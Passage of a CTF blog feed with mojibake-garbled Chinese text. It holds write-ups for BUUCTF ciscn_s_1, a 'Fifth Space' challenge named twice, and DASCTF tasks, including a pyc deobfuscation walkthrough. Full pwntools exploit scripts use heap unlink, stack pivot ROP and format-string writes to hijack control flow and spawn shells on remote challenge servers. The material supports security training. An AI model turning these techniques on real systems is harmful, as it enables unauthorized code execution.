†çš„ç¼–å·ï¼Œå¹¶ä¸”æ ¹æ®è¿™ä¸ªç¼–å·ä½œä¸ºç´¢å¼•ä¸Šbssæ®µæ¥å­˜å‚¨heapçš„åœ°å€ã€‚å¤§å°èŒƒå›´åœ¨<code>0x7f - 0x100</code>ã€‚</p><p>editå‡½æ•°ï¼š</p><pre><code class="c">v0[read(0, (void *)heap[v2], (signed int)len[v2])] = 0;</code></pre><p>æ˜æ˜¾å­˜åœ¨ç€off by nullã€‚ä¸”æœ‰key1æ§åˆ¶ç€ï¼Œåªèƒ½ç¼–è¾‘2æ¬¡ã€‚</p><pre><code class="c">if ( key1 == 2 )    exit(0);</code></pre><p>Showå‡½æ•°ï¼š<br>Key2æœ‰å€¼æ‰èƒ½ç”¨ã€‚</p><h4 id="åˆ©ç”¨-1"><a href="#åˆ©ç”¨-1" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><ul><li>ç”±äºæ²¡æœ‰å¼€å¯pieä¿æŠ¤ï¼Œè¿™æ ·æ˜æ˜¾å¯ä»¥unlinkæ”»å‡»ï¼Œç”³è¯·ä¸€ä¸ª32å †å·çš„å †ï¼Œå¤§å°0xf8ï¼Œéƒ½æ˜¯è¶Šå¤§è¶Šå¥½ï¼Œä¸ºäº†ä¸Šé è¿‘key1ã€key2ï¼Œç„¶åè¿›è¡Œæ§åˆ¶.</li></ul><p>å‰©ä¸‹çš„å°±å¾ˆç®€å•äº†ã€‚</p><h3 id="exp-25"><a href="#exp-25" class="headerlink" title="exp"></a>exp</h3><pre><code class="c">from pwn import *import timelocal_file  = &#39;./ciscn_s_1&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,29756)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(idx,size,data):    sla(&#39;show\n&#39;,&#39;1&#39;)    sla(&#39;dex&#39;,str(idx))    sla(&#39;size&#39;,str(size))    sa(&#39;content&#39;,str(data))def free(idx):    sla(&#39;show\n&#39;,&#39;2&#39;)    sla(&#39;dex&#39;,str(idx))def edit(idx,data):    sla(&#39;show\n&#39;,&#39;3&#39;)    sla(&#39;dex&#39;,str(idx))    sa(&#39;content&#39;,str(data))def show(idx):    sla(&#39;show\n&#39;,&#39;4&#39;)    sla(&#39;dex&#39;,str(idx))key2 = 0x6022B8for i in range(7):    add(i,0xf8,&#39;aaaaaaaa&#39;)add(7,0xf8,&quot;aaaa&quot;)#8payload = p64(0) + p64(0x32) + p64(0x6021e0 - 0x18) + p64(0x6021e0 - 0x10) + p64(0) * 2 + p64(0x30)add(32,0xf8,payload)#32add(8,0x88,&quot;aaaa&quot;)add(9,0xf8,&quot;aaaa&quot;)add(10,0x88,&#39;aaaa&#39;)for i in range(7):    free(i+1) # ç”±äº32çš„å †å—ç”³è¯·åç ´åäº†0å·å †å—çš„åœ¨bssä¸Šåœ°å€çš„å‚¨å­˜payload = &#39;a&#39; * 0x80 + p64(0x180)edit(8,payload)free(9)payload = p64(0) * 3 + p64(0x00000000006021c8) + &#39;\x00&#39;  * (0xf0 - 0x8 * 4) + p64(0x0000000400000001)edit(32,payload)add(11,0x88,&#39; &#39;)show(11)r()libc_base = uu64(r(6)) - 0x3ebf20info_addr(&#39;libc_base&#39;,libc_base)free_hook = libc_base + 0x3ed8e8rec = rce18[1] + libc_basepayload = p64(0) * 3 + p64(free_hook)edit(32,payload)edit(32,p64(rec))free(11)itr()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;BUUCTFæš‘å‡åˆ·é¢˜-1&quot;&gt;&lt;a href=&quot;#BUUCTFæš‘å‡åˆ·é¢˜-1&quot; class=&quot;headerlink&quot; title=&quot;BUUCTFæš‘å‡åˆ·é¢˜(1)&quot;&gt;&lt;/a&gt;BUUCTFæš‘å‡åˆ·é¢˜(1)&lt;/h1&gt;&lt;h2 id=&quot;cmcc-simplerop&quot;&gt;&lt;a href
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>â€œç¬¬äº”ç©ºé—´â€ æ™ºèƒ½å®‰å…¨å¤§èµ›-twice</title>
    <link href="http://chumen77.xyz/2020/06/28/%E2%80%9C%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E2%80%9D%20%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <id>http://chumen77.xyz/2020/06/28/â€œç¬¬äº”ç©ºé—´â€ æ™ºèƒ½å®‰å…¨å¤§èµ›/</id>
    <published>2020-06-28T12:43:20.845Z</published>
    <updated>2020-07-31T04:17:47.701Z</updated>
    
    <content type="html"><![CDATA[<h1 id="â€œç¬¬äº”ç©ºé—´â€-æ™ºèƒ½å®‰å…¨å¤§èµ›"><a href="#â€œç¬¬äº”ç©ºé—´â€-æ™ºèƒ½å®‰å…¨å¤§èµ›" class="headerlink" title="â€œç¬¬äº”ç©ºé—´â€ æ™ºèƒ½å®‰å…¨å¤§èµ›"></a>â€œç¬¬äº”ç©ºé—´â€ æ™ºèƒ½å®‰å…¨å¤§èµ›</h1><p>æ¯”èµ›æ—¶å½“å¤©æœ‰è€ƒè¯•ï¼Œå°±åšäº†ä¸ªç­¾é“é¢˜ã€‚</p><h2 id="twice"><a href="#twice" class="headerlink" title="twice"></a>twice</h2><h3 id="æŸ¥ä¿æŠ¤"><a href="#æŸ¥ä¿æŠ¤" class="headerlink" title="æŸ¥ä¿æŠ¤"></a>æŸ¥ä¿æŠ¤</h3><pre><code class="python">    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h3 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><ul><li>ç¨‹åºå¯ä»¥ç»™ä½ 2æ¬¡çš„è¯»æ“ä½œï¼Œç¬¬ä¸€æ¬¡è¯»89å­—èŠ‚ï¼Œç¬¬äºŒæ¬¡è¯»112å­—èŠ‚</li><li>æ ˆå¤§å°æ˜¯<code>0x60</code>ï¼Œå­˜åœ¨æ ˆæº¢å‡ºã€‚</li></ul><pre><code class="python">0x7fffffffe3b0 --&gt; 0x6097ecbc626822000x7fffffffe3b8 --&gt; 0x6097ecbc626822000128| 0x7fffffffe3c0 --&gt; 0x7fffffffe3d0 --&gt; 0x4008c0 (&lt;__libc_csu_init&gt;:    push   r15)0136| 0x7fffffffe3c8 --&gt; 0x4008ad (&lt;main+50&gt;:    test   eax,eax)0144| 0x7fffffffe3d0 --&gt; 0x4008c0 (&lt;__libc_csu_init&gt;:    push   r15)0152| 0x7fffffffe3d8 --&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;:    mov    edi,eax)0160| 0x7fffffffe3e0 --&gt; 0x10168| 0x7fffffffe3e8 --&gt; 0x7fffffffe4b8 --&gt; 0x7fffffffe71f (&quot;/media/psf/mypwn/no5space/pwn&quot;)0176| 0x7fffffffe3f0 --&gt; 0x1f7ffcca0</code></pre><ul><li>è°ƒè¯•å‘ç°ç¬¬ä¸€æ¬¡readï¼Œå¯ä»¥leak canary å’Œä¸€ä¸ªæ ˆåœ°å€ï¼Œä»è€Œå¯ä»¥æ ¹æ®åç§»ç®—å‡ºæ ˆä¸Šå…¶ä»–æœ‰ç”¨çš„åœ°å€ã€‚</li><li>ç¬¬äºŒæ¬¡ï¼Œéœ€è¦å¡«å……ä¸€ä¸‹canaryï¼Œç„¶åå¯ä»¥å»æ”»å‡»ret address</li></ul><p>ä½†æ˜¯ï¼Œå¹¶æ²¡æœ‰æ‹¿åˆ°libcçš„åœ°å€ï¼Œæ˜¯æ— æ³•æ‹¿åˆ°shellã€‚<strong>ç”±äºå¯ä»¥æº¢å‡ºçš„å­—èŠ‚æœ‰é™ï¼Œä¹Ÿæ²¡æ³•è¿›è¡Œropã€‚</strong></p><h3 id="è·å–libcåœ°å€"><a href="#è·å–libcåœ°å€" class="headerlink" title="è·å–libcåœ°å€"></a>è·å–libcåœ°å€</h3><p>æ­¤æ—¶ï¼Œæ ¹æ®å‰é¢æ³„æ¼çš„æ ˆåœ°å€ï¼Œå¯ä»¥ç®—å‡ºreadå‡½æ•°çš„bufæ ˆåœ°å€ï¼Œç„¶å<strong>æ ˆè¿ç§»</strong>ä¸Šå»ï¼Œç„¶åè¿›è¡Œropæ¥leak å‡ºlibcåœ°å€ã€‚</p><p>æ‹¿åˆ°libcåœ°å€ä»¥åï¼Œropçš„ç»ˆç»“åœ°å€ä¸ºç¨‹åºçš„<code>start</code>ã€‚è®©å…¶æ¸…ç†æ ˆï¼Œå†æ¬¡è¿›è¡Œç¨‹åºçš„æ¼æ´åˆ©ç”¨ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./pwn&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;121.36.59.116&#39;,9999)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()# debug()payload = &quot;1&quot; * 0x57 + &#39;a&#39;sla(&quot;&gt;&quot;,payload)ru(&#39;a&#39;)canary = uu64(r(8)) - 0x0aprint(hex(canary))s_base = uu64(r(6)) - 0x70print(hex(s_base))  pop_rsi_pop_r15_ret = 0x0000000000400921pop_rbp_ret = 0x0000000000400690pop_rdi_ret = 0x0000000000400923leave_ret = 0x0000000000400879rop = flat([0,pop_rdi_ret,elf.got[&#39;__libc_start_main&#39;],elf.plt[&#39;puts&#39;],0x0400630])payload = rop.ljust(0x50,&#39;\0&#39;)payload += p64(canary) +p64(canary) + p64(s_base) + p64(leave_ret)# debug()sa(&quot;&gt;&quot;,payload)r(1)libc_base = uu64(r(6)) - libc.symbols[&#39;__libc_start_main&#39;]info_addr(&#39;libc_base&#39;,libc_base)sla(&quot;&gt;&quot;,&#39;1&#39;)ru(&#39;1&#39;)rop = flat([0,pop_rdi_ret,elf.got[&#39;__libc_start_main&#39;],elf.plt[&#39;puts&#39;],0x0400630])payload = rop.ljust(0x50,&#39;\0&#39;)payload += p64(canary) +p64(canary) + p64(libc_base+rce16[1]) + p64(libc_base+rce16[1])sla(&quot;&gt;&quot;,payload)itr()</code></pre><ul><li>æ³¨æ„åœ¨ç¬¬äºŒæ¬¡å‘é€payloadä¸è¦å‘å‡ºå»æ¢è¡Œç¬¦ã€‚</li><li>æœ€åä¸€æ¬¡payload ä¸­çš„ropä»€ä¹ˆçš„éƒ½æ˜¯æŠ„ç¬¬ä¸€æ¬¡çš„payloadï¼Œåªæ˜¯æŠŠæœ€åçš„ret address æ”¹æˆ one gadget ã€‚ï¼ˆåªæ˜¯å¡«å……å­—èŠ‚ç”¨çš„ï¼‰</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;â€œç¬¬äº”ç©ºé—´â€-æ™ºèƒ½å®‰å…¨å¤§èµ›&quot;&gt;&lt;a href=&quot;#â€œç¬¬äº”ç©ºé—´â€-æ™ºèƒ½å®‰å…¨å¤§èµ›&quot; class=&quot;headerlink&quot; title=&quot;â€œç¬¬äº”ç©ºé—´â€ æ™ºèƒ½å®‰å…¨å¤§èµ›&quot;&gt;&lt;/a&gt;â€œç¬¬äº”ç©ºé—´â€ æ™ºèƒ½å®‰å…¨å¤§èµ›&lt;/h1&gt;&lt;p&gt;æ¯”èµ›æ—¶å½“å¤©æœ‰è€ƒè¯•ï¼Œå°±åšäº†ä¸ªç­¾é“é¢˜ã€‚&lt;/p&gt;
&lt;h2 
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>DASCTFå®‰æ’æœˆèµ›(6th)</title>
    <link href="http://chumen77.xyz/2020/06/27/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B(6th)/"/>
    <id>http://chumen77.xyz/2020/06/27/DASCTFå®‰æ’æœˆèµ›(6th)/</id>
    <published>2020-06-27T14:27:37.170Z</published>
    <updated>2020-06-28T12:43:13.866Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DASCTFå®‰æ’æœˆèµ›-6th"><a href="#DASCTFå®‰æ’æœˆèµ›-6th" class="headerlink" title="DASCTFå®‰æ’æœˆèµ›(6th)"></a>DASCTFå®‰æ’æœˆèµ›(6th)</h1><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="pyCharm-pycæ–‡ä»¶æ¢å¤"><a href="#pyCharm-pycæ–‡ä»¶æ¢å¤" class="headerlink" title="pyCharm(pycæ–‡ä»¶æ¢å¤)"></a>pyCharm(pycæ–‡ä»¶æ¢å¤)</h3><p>è¿™ä¸ªé¢˜åŸºæœ¬å‚è€ƒ<a href="https://www.52pojie.cn/thread-912103-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-912103-1-1.html</a>æ¥åšçš„ã€‚</p><h4 id="åŠ è½½pyc-co-code"><a href="#åŠ è½½pyc-co-code" class="headerlink" title="åŠ è½½pyc co_code"></a>åŠ è½½<code>pyc co_code</code></h4><pre><code>In [1]: import dis,marshalIn [2]: f=open(&#39;1.pyc&#39;)In [3]: f.read(4)Out[3]: &#39;\x03\xf3\r\n&#39;In [4]: f.read(4)Out[4]: &#39;jv\xe7^&#39;In [5]: code = marshal.load(f)In [6]: code.co_constsOut[6]:(-1, None, &#39;YamaNalaZaTacaxaZaDahajaYamaIa0aNaDaUa3aYajaUawaNaWaNajaMajaUawaNWI3M2NhMGM=&#39;, &#39;Are u ready?&#39;, 0, 32, &#39;a&#39;, &#39;&#39;, &#39;great!waht u input is the flag u wanna get.&#39;, &#39;pity!&#39;)In [7]: code.co_varnamesOut[7]: ()In [8]: code.co_namesOut[8]:(&#39;base64&#39;, &#39;a&#39;, &#39;raw_input&#39;, &#39;flag&#39;, &#39;b64encode&#39;, &#39;c&#39;, &#39;list&#39;, &#39;d&#39;, &#39;range&#39;, &#39;i&#39;, &#39;join&#39;, &#39;ohh&#39;)In [9]: code.co_codeOut[9]: &quot;q\x03\x00q\x00\x06d\xffd\x00\x00d\x01\x00l\x00\x00Z\x00\x00d\x02\x00Z\x01\x00e\x02\x00d\x03\x00\x83\x01\x00Z\x03\x00e\x00\x00j\x04\x00e\x03\x00\x83\x01\x00Z\x05\x00e\x06\x00e\x05\x00\x83\x01\x00Z\x07\x00x&#39;\x00e\x08\x00d\x04\x00d\x05\x00\x83\x02\x00D]\x16\x00Z\t\x00e\x07\x00e\t\x00c\x02\x00\x19d\x06\x007\x03&lt;qI\x00Wd\x07\x00j\n\x00e\x07\x00\x83\x01\x00Z\x0b\x00e\x0b\x00e\x01\x00k\x02\x00r\x86\x00d\x08\x00GHn\x05\x00d\t\x00GHd\x01\x00S&quot;</code></pre><h4 id="ä½¿ç”¨disåº“å¯¹co-codeè¿›è¡Œåç¼–è¯‘"><a href="#ä½¿ç”¨disåº“å¯¹co-codeè¿›è¡Œåç¼–è¯‘" class="headerlink" title="ä½¿ç”¨disåº“å¯¹co_codeè¿›è¡Œåç¼–è¯‘:"></a>ä½¿ç”¨disåº“å¯¹<code>co_code</code>è¿›è¡Œåç¼–è¯‘:</h4><pre><code>In [10]: dis.dis(code.co_code)          0 JUMP_ABSOLUTE       3    &gt;&gt;    3 JUMP_ABSOLUTE    1536          6 LOAD_CONST      25855 (25855)          9 STOP_CODE         10 STOP_CODE         11 LOAD_CONST          1 (1)         14 IMPORT_NAME         0 (0)         17 STORE_NAME          0 (0)         20 LOAD_CONST          2 (2)         23 STORE_NAME          1 (1)         26 LOAD_NAME           2 (2)         29 LOAD_CONST          3 (3)         32 CALL_FUNCTION       1         35 STORE_NAME          3 (3)         38 LOAD_NAME           0 (0)         41 LOAD_ATTR           4 (4)         44 LOAD_NAME           3 (3)         47 CALL_FUNCTION       1         50 STORE_NAME          5 (5)         53 LOAD_NAME           6 (6)         56 LOAD_NAME           5 (5)         59 CALL_FUNCTION       1         62 STORE_NAME          7 (7)         65 SETUP_LOOP         39 (to 107)         68 LOAD_NAME           8 (8)         71 LOAD_CONST          4 (4)         74 LOAD_CONST          5 (5)         77 CALL_FUNCTION       2         80 GET_ITER         81 FOR_ITER           22 (to 106)         84 STORE_NAME          9 (9)         87 LOAD_NAME           7 (7)         90 LOAD_NAME           9 (9)         93 DUP_TOPX            2         96 BINARY_SUBSCR         97 LOAD_CONST          6 (6)        100 INPLACE_ADD        101 ROT_THREE        102 STORE_SUBSCR        103 JUMP_ABSOLUTE      73    &gt;&gt;  106 POP_BLOCK    &gt;&gt;  107 LOAD_CONST          7 (7)        110 LOAD_ATTR          10 (10)        113 LOAD_NAME           7 (7)        116 CALL_FUNCTION       1        119 STORE_NAME         11 (11)        122 LOAD_NAME          11 (11)        125 LOAD_NAME           1 (1)        128 COMPARE_OP          2 (==)        131 POP_JUMP_IF_FALSE   134    &gt;&gt;  134 LOAD_CONST          8 (8)        137 PRINT_ITEM        138 PRINT_NEWLINE        139 JUMP_FORWARD        5 (to 147)        142 LOAD_CONST          9 (9)        145 PRINT_ITEM        146 PRINT_NEWLINE    &gt;&gt;  147 LOAD_CONST          1 (1)        150 RETURN_VALUE</code></pre><p>è¿™é‡Œé¢éœ€è¦æ³¨æ„çš„å°±æ˜¯å¼€å¤´çš„ï¼š</p><pre><code>          0 JUMP_ABSOLUTE       3    &gt;&gt;    3 JUMP_ABSOLUTE    1536          6 LOAD_CONST      25855 (25855)          9 STOP_CODE         10 STOP_CODE</code></pre><p>æ˜æ˜¾åŠ å…¥äº†æ··æ·†ï¼Œæ€ä¹ˆçªç„¶å°±åœæ­¢äº†<code>STOP_CODE</code>ã€‚æ¥ç€å°±æ˜¯æƒ³åŠæ³•å»é™¤è¿™äº›æ··æ·†ï¼Œå’Œä¿®æ­£<code>co_code</code>é•¿åº¦ï¼ŒæœŸæœ›ä¿®æ”¹åçš„opcodeé¦–è¡Œä¸º</p><pre><code>0 LOAD_CONST 0(0)1 LOAD_CONST 1(1)</code></pre><p>å…¶ä¸­è¿™ç§äºŒè¿›åˆ¶å­—èŠ‚ç å¯¹åº”çš„ç¿»è¯‘ç»“æœï¼š</p><pre><code>0x64 æ“ä½œä¸ºLOAD_CONSTï¼Œç”¨æ³•ä¸¾ä¾‹ï¼šLOAD_CONST 1        HEX: 6401000x71 æ“ä½œä¸ºJUMP_ABSOLUTEï¼Œç”¨æ³•ä¸¾ä¾‹ï¼šJUMP_ABSOLUTE 14                HEX: 710e000x65 æ“ä½œä¸ºLOAD_NAMEï¼Œç”¨æ³•ä¸¾ä¾‹ï¼šLOAD_NAME 1                HEX: 650100</code></pre><p>æ‰€ä»¥å¯»æ‰¾ï¼š</p><pre><code>0 LOAD_CONST 0(0)</code></pre><p>å³ä¸ºå¯»æ‰¾<code>HEX : 640000</code>è¿™ä¸ªä½œä¸ºæ··æ·†å­—æ®µç»“æŸã€‚<br>å¼€å¤´æ€ä¹ˆå¯»æ‰¾å‘¢ã€‚ç”±äºçœ‹å‰é¢3ä¸ªå­—èŠ‚å¯¹åº”ä¸€ä¸ªå«ä¹‰ï¼ŒçŒœæµ‹ï¼š</p><pre><code>0 JUMP_ABSOLUTE       3</code></pre><p>ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼<br>ï¿¼ï¿¼ï¿¼<br><img src="http://qiqianyun.chumen77.xyz/uPic/UceCOc.jpg" srcset="/img/loading.gif" alt></p><p>é‚£å¾ˆæ˜æ˜¾æ··æ·†å­—æ®µå°±æ˜¯ï¼š</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/bKDIpN.png" srcset="/img/loading.gif" alt></p><p>ç„¶åç”¨å·¥å…·åˆ é™¤å³å¯ï¼Œå…¶ä¸­0x97å°±æ˜¯<code>co_code</code></p><pre><code>In [12]: len(code.co_code)Out[12]: 151In [13]: hex(151)Out[13]: &#39;0x97&#39;</code></pre><p>æ‰€ä»¥å»é™¤è¿™8ä¸ªå­—èŠ‚çš„æ··æ·†ä»£ç ï¼Œç„¶åä¿®æ”¹<code>co_code</code>é•¿åº¦ä¸º<code>0x8f</code>ã€‚</p><h4 id="è¿˜åŸåçš„pycå¼€å¤´"><a href="#è¿˜åŸåçš„pycå¼€å¤´" class="headerlink" title="è¿˜åŸåçš„pycå¼€å¤´"></a>è¿˜åŸåçš„pycå¼€å¤´</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/imrvPr.png" srcset="/img/loading.gif" alt></p><h4 id="åç¼–è¯‘"><a href="#åç¼–è¯‘" class="headerlink" title="åç¼–è¯‘"></a>åç¼–è¯‘</h4><p>åç¼–è¯‘æ–¹æ³•å°±å¤šç§å¤šæ ·äº†ï¼Œå¯ä»¥åœ¨çº¿ä»€ä¹ˆçš„ï¼Œæˆ‘ä½¿ç”¨çš„<code>uncompyle6</code>.</p><pre><code>uncompyle6 -o 1.py 1.pyc</code></pre><pre><code># uncompyle6 version 3.7.1# Python bytecode 2.7 (62211)# Decompiled from: Python 2.7.16 (default, Feb 29 2020, 01:55:37)# [GCC 4.2.1 Compatible Apple LLVM 11.0.3 (clang-1103.0.29.20) (-macos10.15-objc-# Embedded file name: pyCharm.py# Compiled at: 2020-06-15 21:23:54import base64a = &#39;YamaNalaZaTacaxaZaDahajaYamaIa0aNaDaUa3aYajaUawaNaWaNajaMajaUawaNWI3M2NhMGM=&#39;flag = raw_input(&#39;Are u ready?&#39;)c = base64.b64encode(flag)d = list(c)for i in range(0, 32):    d[i] += &#39;a&#39;ohh = (&#39;&#39;).join(d)if ohh == a:    print &#39;great!waht u input is the flag u wanna get.&#39;else:    print &#39;pity!&#39;%</code></pre><p>åç¼–è¯‘åè¿™é¢˜å°±ååˆ†ç®€å•äº†ã€‚</p><p>ç»™çš„å­—ç¬¦ä¸²æŠŠâ€œaâ€ï¼Œå»é™¤åè§£ç base64å³å¯ã€‚</p><h3 id="easy-maze"><a href="#easy-maze" class="headerlink" title="easy_maze"></a><code>easy_maze</code></h3><p>ç›´æ¥å»hexä¸‹æå–è¿·å®«ï¼Œç”±äºæ˜¯100ä¸ªå­—ç¬¦ï¼Œå¾ˆå®¹æ˜“è”æƒ³åˆ°æ˜¯10x10çš„è¿·å®«ã€‚<br>ç„¶åä¸¢vscodeã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/Y7wdYy.png" srcset="/img/loading.gif" alt><br>ç›´æ¥è·¯å¾„å°±å‡ºæ¥äº†ã€‚</p><pre><code>jkkjjhjjkjjkkkuukukkuuhhhuukkk</code></pre><p>Md5ä¸€ä¸‹å³å¯ã€‚</p><h3 id="T0p-Gear"><a href="#T0p-Gear" class="headerlink" title="T0p Gear"></a>T0p Gear</h3><p>é¢˜ç›®ä¸éš¾ï¼Œå¤ªèœäº†ï¼Œçœ‹c++æœ‰ç‚¹å¤´å¤§ï¼Œåšçš„æœ‰ç‚¹æ…¢ã€‚IdaåŠ¨æ€è°ƒè¯•ï¼Œä¸€å…±3ä¸ªcheckï¼Œéƒ½æ˜¯æ–­åœ¨<code>Strcmp</code>ã€‚æ¯æ¬¡éšä¾¿è¾“å…¥ï¼Œç„¶ååˆ†æå’Œè·å–rdiï¼Œrsiå¯„å­˜å™¨å¯¹åº”åœ°å€å¤„çš„å­—ç¬¦ä¸²ã€‚æ‹¿åˆ°ä»¥åï¼Œ3ä¸ªæ‹¼æ¥ä¸€ä¸‹å°±æ˜¯flagã€‚</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="springboard"><a href="#springboard" class="headerlink" title="springboard"></a>springboard</h3><p>è€ƒç‚¹å°±æ˜¯å †ä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²åˆ©ç”¨ï¼ŒæŒºç®€å•çš„ã€‚</p><h4 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h4><p> åˆ©ç”¨ç¯å¢ƒå˜é‡é‚£æ¡é“¾ï¼Œè¿›è¡Œæ”»å‡»<code>ret address</code>ï¼Œä¿®æ”¹ä¸ºone gadget<br>ç»™äº†8æ¬¡æ¼æ´åˆ©ç”¨æœºä¼šï¼Œè¿˜æ˜¯å¾ˆå®¹æ˜“å®ç°çš„ã€‚å…¶ä¸­<code>ret address</code>ï¼Œä¸º<code>__libc_start_main+xxx</code></p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><pre><code class="python">from pwn import *import timelocal_file  = &#39;./springboard&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;183.129.189.60&#39;,10029)    libc = ELF(remote_libc)elf = ELF(local_file)# libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()sla(&quot;input&quot;,&quot;1&quot;)sla(&quot;input&quot;,&quot;2&quot;)sla(&quot;input&quot;,&quot;3&quot;)sla(&quot;input&quot;,&quot;%13$pAAAA%11$p&quot;)sleep(0.1)ru(&quot;0x&quot;)tag = int(r(12),16) - 0xe0ru(&quot;AAAA0x&quot;)libc_base = int(r(12),16) -0x21b97info_addr(&quot;libc_base&quot;,libc_base)key1 = hex(tag)[-4:]print(key1)payload = &#39;%{}c%13$hn&#39;.format(int(key1,16))sla(&quot;input&quot;,payload)sleep(5)rec = rce18[1] + libc_basekey2 = hex(rec)[-4:]print(key2)payload = &#39;%{}c%39$hn&#39;.format(int(key2,16))sla(&quot;input&quot;,payload)sleep(5)key3 = int(hex(tag)[-2:],16) + 2print(key3)payload = &#39;%{}c%13$hhn&#39;.format(key3)sla(&quot;input&quot;,payload)sleep(5)key4 = hex(rec)[-6:-4]print(key4)payload = &#39;%{}c%39$hhn&#39;.format(int(key4,16))sla(&quot;input&quot;,payload)itr()# 0000| 0x7fffffffe2f0 --&gt; 0x555555554980 (push   r15)# 0008| 0x7fffffffe2f8 --&gt; 0x55554780# 0016| 0x7fffffffe300 --&gt; 0x555555756010 (&quot;11111111aaaaaaaa1111111122222222\n&quot;)# 0024| 0x7fffffffe308 --&gt; 0x84fa9f2a7e35ae00# 0032| 0x7fffffffe310 --&gt; 0x555555554980 (push   r15)# 0040| 0x7fffffffe318 --&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;:       mov    edi,eax)# 